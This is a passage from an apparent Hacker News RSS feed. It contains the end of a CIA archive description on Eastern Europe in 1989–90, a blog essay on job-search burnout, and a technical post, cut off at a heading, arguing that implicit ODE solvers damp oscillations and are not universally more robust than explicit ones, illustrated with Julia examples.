      &lt;p&gt;The Collapse of Communism in Eastern Europe: A 30-Year Legacy&lt;/p&gt;
      &lt;p&gt;The Collapse of Communism in Eastern Europe: A 30-Year Legacy&lt;/p&gt;
      &lt;p&gt;This collection includes a broad sampling of articles from the National Intelligence Daily—the CIA's principal form of current intelligence analysis at the time—from February 1989 to March 1990. These articles represent much of the Agency's short-term analysis of events unfolding in Central and Eastern Europe as popular opposition to Soviet misrule erupted and quickly surpassed anything the Communist regimes were prepared to understand or to which they could respond. The material also represents a major source of information and insight for US policymakers into what was happening in these countries, where the situation was heading, and how a collapse of Communist rule in Europe and the beginnings of the breakup of the Soviet Union would impact Europe and the United States.&lt;/p&gt;
      &lt;p&gt;Please note: Some of the material is marked "NR" or "not relevant." This means that material is unrelated to events in Central and Eastern Europe, and was therefore not reviewed for declassification as part of this collection.&lt;/p&gt;
      &lt;p&gt;Learn more about the collapse of Communist rule in Europe (105 documents/151 pages)&lt;/p&gt;
    &lt;/quote&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45261764</guid><pubDate>Tue, 16 Sep 2025 13:10:29 +0000</pubDate></item><item><title>When the job search becomes impossible</title><link>https://www.jeffwofford.com/wp/?p=2240</link><description>&lt;doc fingerprint="7748915723d08eaf"&gt;
  &lt;main&gt;
    &lt;p&gt;I have the good fortune to have a job right now, but many of my friends are out of work. Most have been searching for a while. Some are encountering a problem that has my full sympathy, something I’ve experienced myself at various times. I’m not sure I can solve it, but maybe I can help put words to what some are going through.&lt;/p&gt;
    &lt;p&gt;The problem unfolds in three distinct phases as the job search drags on.&lt;/p&gt;
    &lt;head rend="h2"&gt;Phase I: The Obvious but Impossible Search&lt;/head&gt;
    &lt;p&gt;You’ve spent several months sending out scores of carefully tailored resumes and cover letters for jobs you know you are fully qualified for and would excel at. Usually you get no response. Occasionally you get a polite “position filled.” That’s it.&lt;/p&gt;
    &lt;p&gt;You’re knocking on all the obvious doors—all the jobs closest to what you’ve been doing—and nothing is opening up. It’s exhausting and frustrating. The very act of telling your friends you’re “discouraged” feels like swallowing a horse pill; “discouraged” does not reach the depths of your fear and despair.&lt;/p&gt;
    &lt;p&gt;The obvious path forward—finding a job in line with your resume—no longer looks like a path. It looks like The Cliffs of Insanity. What used to feel like the Obvious Way Forward now feels like the Impossible Way Forward. Somewhere in your brain there is a tank of gasoline that gets burned each time you force yourself to do something irksome. That tank has burned down to vapors.&lt;/p&gt;
    &lt;p&gt;You are burned out. You are burned out on search. You are burned out on an impossible search.&lt;/p&gt;
    &lt;p&gt;But you can’t stay still. So your mind looks for new paths.&lt;/p&gt;
    &lt;head rend="h2"&gt;Phase II: The Adjacent-to-Impossible Search&lt;/head&gt;
    &lt;p&gt;You consider job openings that aren’t quite aligned with what you were doing but might offer better chances. Maybe it’s in an adjacent industry, a slightly different role, or somewhere you never really wanted to live. Maybe you could take a small pay cut. Maybe an hour’s commute wouldn’t be so bad. You expand your search away from the impossible to a broader horizon, to things that are adjacent to impossible.&lt;/p&gt;
    &lt;p&gt;This often works! The compromises can turn out better than expected. A pay cut can lead to a quick raise that puts you ahead of your prior pay. Sometimes they turn out worse than expected, but the next job search goes better—new connections, new head space, more time for the market to improve.&lt;/p&gt;
    &lt;p&gt;Sometimes it doesn’t work. The employers don’t bite. The required compromises are just too dire. The adjacent-to-impossible jobs turn out to be impossible too.&lt;/p&gt;
    &lt;p&gt;You are burned out. You are very burned out. The creativity and spunk it took to expand your horizons has gone nowhere. That extra spark has died. The brain’s reserve gas tank is now showing “E.” You are suffering from a disease we call Adjacent-to-Impossible Search Burnout (AISB, for the medical professionals in the room).&lt;/p&gt;
    &lt;p&gt;But you can’t stay still. So your mind looks for new paths.&lt;/p&gt;
    &lt;head rend="h2"&gt;Phase III: Weird Search&lt;/head&gt;
    &lt;p&gt;Well, if none of the obvious or even next-to-obvious stuff is working, why hang around? Throw the gates wide open, go ronin, walk the whole horizon, drag the whole ocean. You could learn to make jewelry and open an Etsy shop. You could band together with friends and make that little app you’ve always talked about. You could open up that little coffee shop, that bakery, that catering business. You could go back to college and learn a new career.&lt;/p&gt;
    &lt;p&gt;It feels like giving up, though, doesn’t it? Wait, no! It feels like taking charge of your own destiny, plotting your own course, becoming master of your fate, all that sort of thing! Except, geez, at maybe one-half, one-fourth the pay, if you’re lucky? Maybe less, if you’re paying for college before you even start this new career.&lt;/p&gt;
    &lt;p&gt;And yet… what’s the alternative? Getting paid zero for the foreseeable future? Continuing to churn out groveling resumes and “I can’t wait to work at your wonderful company that doesn’t have the internal culture of decency or self-discipline to bother responding to this application that you invited, from someone you know really needs answers right now” cover letters?&lt;/p&gt;
    &lt;p&gt;So yes, you go weird, at least mentally, and you entertain ideas about what else in tarnation might possibly pay you a living wage while using your talents and filling up your joy-meter.&lt;/p&gt;
    &lt;p&gt;And sometimes this goes great. Almost every company or product we love started more or less like this. The next one might be yours. I like the weird path, and if you take it and it blossoms, I salute you and I bless you.&lt;/p&gt;
    &lt;p&gt;But we’re here for the ones that are still stuck in this place, this third phase.&lt;/p&gt;
    &lt;p&gt;You have been thwarted by the Cliffs of Insanity. You have become nauseated by the Wide World of Compromise. But nowhere else on your broad horizon has yet called you forward.&lt;/p&gt;
    &lt;p&gt;And here’s the deal: here’s how you know you are really at the end of the rope: you are sick of freaking thinking about it.&lt;/p&gt;
    &lt;p&gt;You are sicking of trying to find jobs you should have. You are sick of trying to find jobs you could have. You are sick of trying to find jobs you shouldn’t have—jobs that could be fun but would make your grandmother shake her head a little. You are burned out on search. All possible gas tanks are empty. All the creative-hopeful-bright-idea-one-more-try sauce is gone, dried up, kaput.&lt;/p&gt;
    &lt;p&gt;You are Burned Out On Search (BOOS for the professionals). That’s the problem. That’s the disease. You’re welcome.&lt;/p&gt;
    &lt;head rend="h2"&gt;Solutions&lt;/head&gt;
    &lt;p&gt;I don’t know. I can’t solve your problem. If your problem wasn’t genuinely hard you would have solved it already. Some stranger who doesn’t know your situation ain’t gonna solve it. But here are some notes I’ve picked up along similar roads.&lt;/p&gt;
    &lt;p&gt;You’re not alone. A lot, a lot of people are in this boat right now, and frankly, in any given year somebody, probably somebody you know, is in this boat. As I write, 40% of unemployed people have been out of work for at least 15 weeks. That’s almost four months. Fully a fourth have been unemployed at least 27 weeks: over six months. Unemployment is not strange or rare. Happens to everybody: good, capable people who did miracles at prior organizations and will do them again, they just can’t do them right now.&lt;/p&gt;
    &lt;p&gt;It sucks real bad. Let’s not understate the horror of unemployment in a modern economy. Talk about a Cliff of Insanity: there is an unbelievable drop in wellbeing from the employed to unemployed. I don’t need to spell it all out—the money stuff, the healthcare stuff, the embarrassment, the boredom, the fear. It’s bad.&lt;/p&gt;
    &lt;p&gt;And yet somehow in the grand scheme of social sympathy and compassion, unemployment doesn’t get a lot of loving. Tell folks you’ve got knee problems, house foundation problems, college debt, divorce, death in the family, hair stylist went rogue this morning and messed up your cowlick, and here comes all kinds of sympathy. Tell them you’re unemployed, what do you get? “Oh yeah I was unemployed one month ten years ago boy that sucked.” Yes, friend, yes it does suck right now six months in, and unlike your little story there I don’t know when or if it will ever stop.&lt;/p&gt;
    &lt;p&gt;But I do feel you. High five. I feel you.&lt;/p&gt;
    &lt;p&gt;It won’t turn out as bad as you fear. How often have you known somebody whose life was really, finally wrecked by unemployment? I mean, they truly never got back on their feet. Maybe previously they had a decent home, but then they became homeless, and now they’re still homeless? I’m not just talking about stories and imagination and movies right now, I’m talking about who do you personally know who’s had it go that badly?&lt;/p&gt;
    &lt;p&gt;And look, it does happen. I’m not saying that 100% of people spring back from unemployment. But in your experience what percentage of people get back to a decent place? 90%? It’s got to be more than that. 95%? 99%? Most of the time, your friends and family members go through a period of unemployment and then they find a new, good life on the other side. It might be in the obvious place, it might not be. It might be on one of those “weird paths” we talked about, but very often the new path, no matter how weird, becomes stable and sufficient and even joyful.&lt;/p&gt;
    &lt;p&gt;People—you—are more resilient and resourceful than you think. You are skillful at imagining bad outcomes. You are also skillful at avoiding them. Do yourself a favor, set aside the imagining bad outcomes skill for a year or two and focus for now on the avoiding skill—and the finding skill that runs along with it.&lt;/p&gt;
    &lt;p&gt;It’s okay to rest. This is the best lesson I’ve learned from these kinds of seasons. When you’ve searched and you’ve searched without success until you’re sick of searches, usually the lesson is: now it’s time to rest.&lt;/p&gt;
    &lt;p&gt;There is a time for hard work, very hard work. There’s a time to push yourself, even to push beyond the limits of what you think you can endure. But a time comes when you are at the limit, at least for now. In those times, the word is “rest.”&lt;/p&gt;
    &lt;p&gt;Rest is much more than mere idleness. When you rest you give your mind the space to explore possibilities it never had time to consider. Often this exploration happens without your knowing it. Suddenly you see a new way to tackle that challenge. Or you realize it was the wrong challenge to begin with, that what you needed was a different quest. Rest refuels the mind. It refills the gas tanks. It untwists wounded joints. It builds up sore muscles.&lt;/p&gt;
    &lt;p&gt;We’re not talking about watching eight hours of YouTube every day or playing video games till 4 AM. Rest is all about space. It engages purposefully with serious boredom. You’re going to need to get in there and stare at some ceilings—or better yet, from a hammock, at some skies. Give the mind space to think.&lt;/p&gt;
    &lt;p&gt;Rest should involve time with friends but also plenty of solitude. It ought to involve some deep reading—books, not just the short pieces—especially those that are full of new ideas, not on the usual menu, surprising perspectives that get your thoughts percolating.&lt;/p&gt;
    &lt;p&gt;Rest needs to be done well. Set your alarm. Make appointments and keep them. Get outside. Use your hands.&lt;/p&gt;
    &lt;p&gt;When you’re Burned Out On Search, what do you do next? When we ask it that way the answer becomes obvious. You rest. It’s the only antidote to burn out. Give your mind time to rebuild and it will find ways forward that you never expected. Sometimes the best way to search is… not to search.&lt;/p&gt;
    &lt;head rend="h3"&gt;Discover more from Holy Ghost Stories&lt;/head&gt;
    &lt;p&gt;Subscribe to get the latest posts sent to your email.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45261848</guid><pubDate>Tue, 16 Sep 2025 13:18:00 +0000</pubDate></item><item><title>Generative AI as Seniority-Biased Technological Change</title><link>https://papers.ssrn.com/sol3/papers.cfm?abstract_id=5425555</link><description></description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45261930</guid><pubDate>Tue, 16 Sep 2025 13:24:35 +0000</pubDate></item><item><title>Implicit ODE solvers are not universally more robust than explicit ODE solvers</title><link>https://www.stochasticlifestyle.com/implicit-ode-solvers-are-not-universally-more-robust-than-explicit-ode-solvers-or-why-no-ode-solver-is-best/</link><description>&lt;doc fingerprint="3f09c854abe7bb95"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Implicit ODE Solvers Are Not Universally More Robust than Explicit ODE Solvers, Or Why No ODE Solver is Best&lt;/head&gt;
    &lt;head rend="h4"&gt;September 4 2025 in Differential Equations, Julia, Mathematics, Programming | Tags: bdf, euler, explicit, implicit, numerical analysis, ode, runge-kutta, solver | Author: Christopher Rackauckas&lt;/head&gt;
    &lt;p&gt;A very common adage in ODE solvers is that if you run into trouble with an explicit method, usually some explicit Runge-Kutta method like RK4, then you should try an implicit method. Implicit methods, because they are doing more work, solving an implicit system via a Newton method having “better” stability, should be the thing you go to on the “hard” problems.&lt;/p&gt;
    &lt;p&gt;This is at least what I heard at first, and then I learned about edge cases. Specifically, you hear people say “but for hyperbolic PDEs you need to use explicit methods”. You might even intuit from this “PDEs can have special properties, so sometimes special things can happen with PDEs… but ODEs, that should use implicit methods if you need more robustness”. This turns out to not be true, and really understanding the ODEs will help us understand better why there are some PDE semidiscretizations that have this “special cutout”.&lt;/p&gt;
    &lt;p&gt;What I want to do in this blog post is more clearly define what “better stability” actually means, and show that it has certain consequences that can sometimes make explicit ODE solvers actually more robust on some problems. And not just some made-up problems, lots of real problems that show up in the real world.&lt;/p&gt;
    &lt;head rend="h2"&gt;A Quick Primer on Linear ODEs&lt;/head&gt;
    &lt;p&gt;First, let’s go through the logic of why implicit ODE solvers are considered to be more robust, which we want to define in some semi-rigorous way as “having a better chance to give an answer closer to the real answer”. In order to go from semi-rigorous into a rigorous definition, we can choose a test function, and what better test function to use than a linear ODE. So let’s define a linear ODE:&lt;/p&gt;
    &lt;p&gt;$$u’ = \lambda u$$&lt;/p&gt;
    &lt;p&gt;is the simplest ODE. We can even solve it analytically, $u(t) = \exp(\lambda t)u(0)$. For completeness, we can generalize this to a linear system of ODEs, where instead of having a scalar $u$ we can let $u$ be a vector, in which case the linear ODE has a matrix of parameters $A$, i.e.&lt;/p&gt;
    &lt;p&gt;$$u’ = Au$$&lt;/p&gt;
    &lt;p&gt;In this case, if $A$ is diagonalizable, $A = P^{-1}DP$, then we can replace $A$:&lt;/p&gt;
    &lt;p&gt;$$u’ = P^{-1}DP u$$&lt;/p&gt;
    &lt;p&gt;$$Pu’ = DPu$$&lt;/p&gt;
    &lt;p&gt;or if we let $w = Pu$, then&lt;/p&gt;
    &lt;p&gt;$$w’ = Dw$$&lt;/p&gt;
    &lt;p&gt;where $D$ is a diagonal matrix. This means that for every element of $w$ we have the equation:&lt;/p&gt;
    &lt;p&gt;$$w_i’ = \lambda_i w_i$$&lt;/p&gt;
    &lt;p&gt;where $w_i$ is the vector in the direction of the $i$th eigenvector of $A$, and $\lambda_i$ is the $i$th eigenvalue of $A$. Thus our simple linear ODE $u’ = \lambda u$ tells us about general linear systems along the eigenvectors. Importantly, since even for real $A$ we can have $\lambda$ be a complex number, i.e. real-valued matrices can have complex eigenvalues, it’s important to allow for $\lambda$ to be complex to understand all possible systems.&lt;/p&gt;
    &lt;p&gt;But why is this important for any other ODE? Well by the Hartman-Grobman theorem, for any sufficiently nice ODE:&lt;/p&gt;
    &lt;p&gt;$$u’ = f(u)$$&lt;/p&gt;
    &lt;p&gt;We can locally approximate the ODE by:&lt;/p&gt;
    &lt;p&gt;$$u’ = Au$$&lt;/p&gt;
    &lt;p&gt;where $A = f'(u)$, i.e. $A$ is the linear system defined by the Jacobian local to the point. This is effectively saying any “sufficiently nice” system (i.e. if $f$ isn’t some crazy absurd function and has properties like being differentiable), you can understand how things locally move by looking at the system approximated by a linear system, where the right linear approximation is given by the Jacobian. And we know that linear systems then boil down generally to just the scalar linear system, and so understanding the behavior of a solver on the scalar linear system tells us a lot about how it will do “for small enough h”.&lt;/p&gt;
    &lt;p&gt;Okay, there are lots of unanswered questions, such as what if $A$ is not diagonalizable? What if $f$ is not differentiable? What if the system is very nonlinear so the Jacobian changes very rapidly? But under assumptions that things are nice enough, we can say that if a solver does well on $u’ = \lambda u$ then it is probably some idea of good.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why implicit ODE solvers are “better”, i.e. more robust&lt;/head&gt;
    &lt;p&gt;So now we have a metric by which we can analyze ODEs: if they have good behavior on $u’ = \lambda u$, then they are likely to be good in general. So what does it mean to have good behavior on $u’ = \lambda u$? One nice property would be to at least be asymptotically correct for the most basic statement, i.e. does it go to zero when it should? If you have $u’ = \lambda u$ and $\lambda$ is negative, then the analytical solution $u(t) = \exp(\lambda t)u(0)$ goes to zero as $t$ goes to infinity. So a good question to ask is, for a given numerical method, for what values of $h$ (the time step size) does the numerical method give a solution that goes to zero, and for which $h$ does it get an infinitely incorrect answer?&lt;/p&gt;
    &lt;p&gt;To understand this, we just take a numerical method and plug in the test equation. So the first thing to look at is Euler’s method. For Euler’s method, we step forward by $h$ by assuming the derivative is constant along the interval, or:&lt;/p&gt;
    &lt;p&gt;$$u_{n+1} = u_n + hf(u_n)$$&lt;/p&gt;
    &lt;p&gt;When does this method give a solution that is asymptotically consistent? With a little bit of algebra:&lt;/p&gt;
    &lt;p&gt;$$u_{n+1} = u_n + h\lambda u_n$$&lt;/p&gt;
    &lt;p&gt;$$u_{n+1} = (1 + h\lambda) u_n$$&lt;/p&gt;
    &lt;p&gt;Let $z = h\lambda$, which means&lt;/p&gt;
    &lt;p&gt;$$u_{n+1} = (1 + z) u_n$$&lt;/p&gt;
    &lt;p&gt;This is a discrete dynamical system which has the analytical solution:&lt;/p&gt;
    &lt;p&gt;$$u_n = u_0 (1+z)^{n}$$&lt;/p&gt;
    &lt;p&gt;Note that if $1 + z &amp;gt; 1$, then $(1+z)^n$ keeps growing as $n$ increases, so this goes to infinity, while if $1 + z &amp;lt; 1$ it goes to zero. But since $\lambda$ can actually be a complex number, the analysis is a little bit more complex (pun intended), but it effectively means that if $z$ is in the unit circle shifted to the left in the complex plane by 1, then $u_n \rightarrow 0$. This gives us the definition of the stability region, $G(z)$ is the region for which $u_n \rightarrow 0$, and this is the shifted unit circle in the complex plane for explicit Euler.&lt;/p&gt;
    &lt;p&gt;This shows a pretty bad property for this method. For any given $\lambda$ with negative real part, there is a maximum $h$, actually $h = 1/\lambda$, such that for any larger step size we don’t just get a bad answer, we can get an infinitely bad answer, i.e. the analytical solution goes to zero but the numerical solution goes to infinity!&lt;/p&gt;
    &lt;p&gt;So, is there a method that doesn’t have this bad property? In comes the implicit methods. If you run the same analysis with implicit Euler,&lt;/p&gt;
    &lt;p&gt;$$u_{n+1} = u_n + hf(u_{n+1})$$&lt;/p&gt;
    &lt;p&gt;$$u_{n+1} = u_n + h\lambda u_{n+1}$$&lt;/p&gt;
    &lt;p&gt;$$(1-z) u_{n+1} = u_n$$&lt;/p&gt;
    &lt;p&gt;$$u_{n+1} = \frac{1}{1-z} u_n$$&lt;/p&gt;
    &lt;p&gt;Then we have almost an “inverse” answer, i.e. $G(z)$ is everything except the unit circle in the complex plane shifted to the right. This means that for any $\lambda$ with negative real part, for any $h$ the implicit Euler method has $u_n \rightarrow 0$, therefore it’s never infinitely wrong.&lt;/p&gt;
    &lt;p&gt;Therefore it’s just better, QED.&lt;/p&gt;
    &lt;p&gt;This then generalizes to more advanced methods. For example, the stability region of RK4&lt;/p&gt;
    &lt;p&gt;an explicit method has a maximum $h$, while the stability region of BDF2&lt;/p&gt;
    &lt;p&gt;an implicit method does not. You can even prove it’s impossible for any explicit method to have this “good” property, so “implicit methods are better”. QED times 2, done deal.&lt;/p&gt;
    &lt;head rend="h2"&gt;Wait a second, what about that other “wrongness”?&lt;/head&gt;
    &lt;p&gt;Any attentive student should immediately throw their hand up. “Teacher, given the $G(z)$ you said, you also have that for any $\lambda$ where $\text{Re}(\lambda)&amp;gt;1$, you also have that $u_n \rightarrow 0$, but in reality the analytical solution has $u(t) \rightarrow \infty$, so implicit Euler is infinitely wrong! And explicit Euler has the correct asymptotic behavior since it goes to infinity!”&lt;/p&gt;
    &lt;p&gt;That is completely correct! But it can be easy to brush this off with “practical concerns”. If you have a real model which has positive real eigenvalues like that, then it’s just going to explode to infinity. Those kinds of models aren’t really realistic? Energy goes to infinity, angular momentum goes to infinity, the chemical concentration goes to infinity: whatever you’re modeling just goes crazy! If you’re in this scenario, then your model is probably wrong. Or if the model isn’t wrong, the numerical methods aren’t very good anyways. If you analyze the error propagation properties, you’ll see the error of the numerical method also increases exponentially! So this is a case you shouldn’t be modeling anyways.&lt;/p&gt;
    &lt;head rend="h2"&gt;Seeing this robustness in practice&lt;/head&gt;
    &lt;p&gt;Therefore if you need a more accurate result, use an implicit method. And you don’t need to go to very difficult models to see this manifest in practice. Take the linear ODE:&lt;/p&gt;
    &lt;p&gt;$$T’ = 5(300-T)$$&lt;/p&gt;
    &lt;p&gt;with $T(0) = 320$. This is a simple model of cooling an object with a constant temperature influx. It’s easy to analytically solve, you just have an exponential fall in the temperature towards $T = 300$ the steady state. But when we solve it with an explicit method at default tolerances, that’s not what we see:&lt;/p&gt;
    &lt;quote&gt;using OrdinaryDiffEq function cooling(du,u,p,t) du[1] = 5.0*(300-u[1]) end u0 = [310.0] tspan = (0.0,10.0) prob = ODEProblem(cooling, u0, tspan) sol = solve(prob, Tsit5()) using Plots plot(sol, title="RK Method, Cooling Problem") savefig("rk_cooling.png")&lt;/quote&gt;
    &lt;p&gt;We see that the explicit method gives oscillations in the solution! Meanwhile, if we take a “robust” implicit method like the BDF method from the classic C++ library SUNDIALS, we can solve this:&lt;/p&gt;
    &lt;quote&gt;using Sundials sol = solve(prob, CVODE_BDF()) plot(sol, title="BDF Method, Cooling Problem") savefig("bdf_cooling.png")&lt;/quote&gt;
    &lt;p&gt;Sure it’s not perfectly accurate, but at least it doesn’t give extremely wrong behavior. We can decrease tolerances to make this all go away,&lt;/p&gt;
    &lt;p&gt;But the main point is that the explicit method is just generally “less robust”, you have to be more careful, it can give things that are just qualitatively wrong.&lt;/p&gt;
    &lt;p&gt;This means that “good tools”, tools that have a reputation for robustness, they should default to just using implicit solvers because that’s going to be better. And you see that in tools like Modelica. For example, the Modelica University’s playground and other tools in the space like OpenModelica and Dymola, default to implicit solvers like DASSL. And you can see they do great on this problem by default!&lt;/p&gt;
    &lt;p&gt;Modelica tools gives a good answer out of the box.&lt;/p&gt;
    &lt;p&gt;So QED, that’s the “right thing to do”: if you want to be robust, stick to implicit methods.&lt;/p&gt;
    &lt;head rend="h2"&gt;But why oscillations?&lt;/head&gt;
    &lt;p&gt;Hold up a bit… why does the explicit method give oscillations? While we know that’s wrong, it would be good to understand why it gives the qualitatively wrong behavior that it does. It turns out that this falls right out of the definition of the method. If you go back to the definition of explicit Euler on the test problem, i.e.&lt;/p&gt;
    &lt;p&gt;$$u_{n+1} = u_n + hf(u_n)$$&lt;/p&gt;
    &lt;p&gt;then substitute in:&lt;/p&gt;
    &lt;p&gt;$$u_{n+1} = (1 + h\lambda) u_{n}$$&lt;/p&gt;
    &lt;p&gt;If we think about our stability criteria $G(z)$ another way, its boundaries are exactly the value by which the next $u_{n+1}$ would have a negative real part. So the analytical solution is supposed to go to zero, but the “bad” behavior is when we choose a step size $h$ such that if we extrapolate out with a straight line for $h$ long in time, then we will “jump” over this zero, something that doesn’t happen in the analytical solution. But now let’s think about what happens in that case. If you jump over zero, then $u_n &amp;lt; 0$ (think real right now), so therefore the derivative of the next update points in the other direction, i.e. we're still going towards zero, but now from the negative side we go up to zero. But since $\|1 + h\lambda\| &amp;gt; 1$, we have that $\|u_{n+1}\| &amp;gt; \|u_n\|$, i.e. the norm of the solution keeps growing. So you jump from positive to negative, then negative to positive, then positive to negative, where the jumps are growing each time. This is the phantom oscillations of the explicit ODE solver!&lt;/p&gt;
    &lt;p&gt;So what’s happening is the default tolerances of the explicit ODE solver were large enough that the chosen $h$s were in the range of the phantom oscillation behavior, and so you just need to cap $h$ below that value, which is dependent on the real part of the eigenvalue of $h$ (you can do the same analysis with complex numbers, but that just gives rotations in the complex plane along with the real part oscillation).&lt;/p&gt;
    &lt;p&gt;But if explicit methods give oscillations, what’s going on with implicit ODE solvers with large $h$? Let’s look at the update equation again:&lt;/p&gt;
    &lt;p&gt;$$u_{n+1} = \frac{1}{1-z} u_n$$&lt;/p&gt;
    &lt;p&gt;now instead of multiplying each time by $(1-z)$, we divide by it. This means that when $\lambda &amp;lt; 0$ (or $\text{Re}(\lambda) &amp;lt; 0$ to be more exact), then for any $h$ we have that $\|u_{n+1}\| &amp;lt; \|u_{n}\|$. Therefore, we might jump over the zero with a big enough $h$, but we are guaranteed that our "jump size" is always shrinking. Thus for any $h$, we will get to zero because we're always shrinking in absolute value. This means that implicit methods are working because they have a natural dampening effect. So:&lt;/p&gt;
    &lt;head rend="h4"&gt;Explicit methods introduce spurious oscillations, but implicit methods naturally damp oscillations&lt;/head&gt;
    &lt;p&gt;This explains in more detail why we saw what we saw: the explicit method when the error tolerance is sufficiently high will introduce oscillations that don’t exist, while the implicit method will not have this behavior. This is a more refined version of the “energy doesn’t go to infinity!”, now it’s “energy doesn’t come from nowhere in real systems”, and because of this implicit solvers give a better qualitative answer. This is why they are more robust, which is why robust software for real engineers just always default to them.&lt;/p&gt;
    &lt;head rend="h2"&gt;Wait a second… do we always want that?&lt;/head&gt;
    &lt;p&gt;You should now be the student in the front row raising your hand, “implicit methods are always dampening… is that actually a good idea? Are you sure that’s always correct?” And the answer is… well it’s not. And that then gives us exactly the failure case for which implicit methods are less robust. If you have a system that is supposed to actually oscillate, then this “hey let’s always dampen everything to make solving more robust” actually leads to very wrong answers!&lt;/p&gt;
    &lt;p&gt;To highlight this, let’s just take a simple oscillator. You can think of this as a harmonic oscillator, or you can think about it as a simple model of a planet going around a star. However you want to envision it, you can write it out as a system of ODEs:&lt;/p&gt;
    &lt;p&gt;$$u_1′ = 500u_2$$&lt;lb/&gt; $$u_2′ = -500u_1$$&lt;/p&gt;
    &lt;p&gt;This is the linear ODE $u’ = Au$ where $A = [0\ 500; -500\ 0]$, which has complex eigenvalues with zero real part. In other words, the analytical solution is $\sin(500t)$ and $\cos(500t)$, just a pure oscillation that just keeps going around and around in circles. If we solve this with an explicit ODE solver:&lt;/p&gt;
    &lt;quote&gt;function f(du,u,p,t) du[1] = 500u[2] du[2] = -500u[1] end u0 = [1.0,1.0] tspan = (0.0,1.0) prob = ODEProblem(f, u0, tspan) sol = solve(prob, Tsit5()) plot(sol, title="RK Method", idxs=(1,2)) savefig("rk_oscillate.png")&lt;/quote&gt;
    &lt;p&gt;we can see that it generally gets the right answer. Over time you get some drift where the energy is slowly increasing due to numerical error in each step, but it’s going around in circles relatively well. However, our “robust implicit method”…&lt;/p&gt;
    &lt;quote&gt;sol = solve(prob, CVODE_BDF()) plot(sol, title="BDF Method", idxs=(1,2)) savefig("bdf_oscillate.png")&lt;/quote&gt;
    &lt;p&gt;is just not even close. And you can see that even our “robust Modelica tools” completely fall apart:&lt;/p&gt;
    &lt;p&gt;It says the answer goes to zero! Even when the analytical solution is just a circle! But we can understand why this is the case: the software developers made the implicit assumption that “dampening oscillations is always good, because generally that’s what happens in models, so let’s always do this by default so people get better answers”, and the result of this choice is that if someone puts in a model of the Earth going around the sun, then oops the Earth hits the sun pretty quickly.&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion: ODE solvers make trade-offs, you need to make the right ones for your domain&lt;/head&gt;
    &lt;p&gt;This gives us the conclusion: there is no “better” or “more robust” ODE solver method, it’s domain-specific. This is why the Julia ODE solver package has hundreds of methods, because each domain can be asking for different properties that they want out of the method. Explicit methods are not generally faster, they are also something that tends to preserve (or generate) oscillations. Implicit methods are not generally more robust, they are methods which work by dampening transients, which is a good idea for some models but not for others. But then there’s a ton of nuance. For example, can you construct an explicit ODE solver so that on such oscillations you don’t get energy growth? You can! Anas5(w) is documented as “4th order Runge-Kutta method designed for periodic problems. Requires a periodicity estimate w which when accurate the method becomes 5th order (and is otherwise 4th order with less error for better estimates)”, i.e. if you give it a canonical frequency 500 it will be able to do extremely well on this problem (and being a bit off in that estimate still works, it just has energy growth that is small).&lt;/p&gt;
    &lt;p&gt;What about what was mentioned at the beginning of the article, “for hyperbolic PDEs you need to use explicit methods”? This isn’t a “special behavior” of PDEs, this is simply because for this domain, for example advective models of fluids, you want to conserve fluid as it moves. If you choose an implicit method, it “dampens” the solver, which means you get that as you integrate you get less and less fluid, breaking the conservation laws and giving qualitatively very incorrect solutions. If you use explicit methods, you don’t have this extraneous dampening, and this gives a better looking solution. But you can go even further and develop methods for which, if $h$ is sufficiently small, then you get little to no dampening. These are SSP methods, which we say are “for Hyperbolic PDEs (Conservation Laws)” but in reality what we mean is “when you don’t want things to dampen”.&lt;/p&gt;
    &lt;p&gt;But the point is, you can’t just say “if you want a better solution, use an implicit solver”. Maybe in some domains and for some problems that is true, but in other domains and problems that’s not true. And many numerical issues can stem from the implicit assumptions that follow from the choice being made for the integrator. Given all of this, it should be no surprise that much of the Modelica community has had many problems handling fluid models, the general flow of “everything is a DAE” → “always use an implicit solver” → “fluid models always dampen” → “we need to fix the dampening” could be fixed by making different assumptions at the solver level.&lt;/p&gt;
    &lt;p&gt;So, the next time someone tells you should just use ode15s or scipy.integrate.radau in order to make things robust without knowing anything about your problem, say “umm actually”.&lt;/p&gt;
    &lt;head rend="h2"&gt;Little Extra Details&lt;/head&gt;
    &lt;p&gt;The article is concluded. But here’s a few points I couldn’t fit into the narrative I want to mention:&lt;/p&gt;
    &lt;head rend="h3"&gt;Trapezoidal is cool&lt;/head&gt;
    &lt;p&gt;One piece I didn’t fit in here is that the Trapezoidal method is cool. The dampening property comes from L-stability, i.e. $G(z) \rightarrow 0$ as $\text{Re}(z) \rightarrow -\infty$. This is a stricter form of stability, since instead of just being stable for any finite $\lambda$, this also enforces that you are stable at the limit of bigger lambdas. “Most” implicit solvers that are used in practice, like Implicit Euler, have this property, and you can show the dampening is directly related to this property. But you can have an implicit method that isn’t L-stable. Some of these methods include Adams-Bashforth-Moulton methods, which are not even A-stable so they tend to have stability properties and act more like explicit methods. But the Trapezoidal method is A-stable without being L-stable, so it doesn’t tend to dampen while it tends to be also pretty stable. Though it’s not as stable, and the difference between “is stable for any linear ODE” versus “actually stable for nonlinear ODEs” (i.e. B-stability) is pronounced on real-world stiff problems. What this means in human terms is that the Trapezoidal method tends to not be stable enough for hard stiff problems, but it also doesn’t artificially dampen, so it can be a good default in cases where you know you have “some stiffness” but also want to keep some oscillations. One particular case of this is in some electrical circuit models with natural oscillators.&lt;/p&gt;
    &lt;head rend="h3"&gt;Lower order methods have purposes too&lt;/head&gt;
    &lt;p&gt;“All ODE solvers have a purpose”, I give some talks that give the justification for many high order methods, so in general “higher order is good if you solve with stricter tolerances and need more precision”. But lower order methods can be better because the higher order methods require that more derivatives of $f$ are defined, and if that’s not the case (like derivative discontinuities), then lower order methods will be more efficient. So even implicit Euler has cases where it’s better than higher order BDF methods, and it has to do with “how nice” $f$ is.&lt;/p&gt;
    &lt;head rend="h3"&gt;BDF methods like DASSL are actually α-stable&lt;/head&gt;
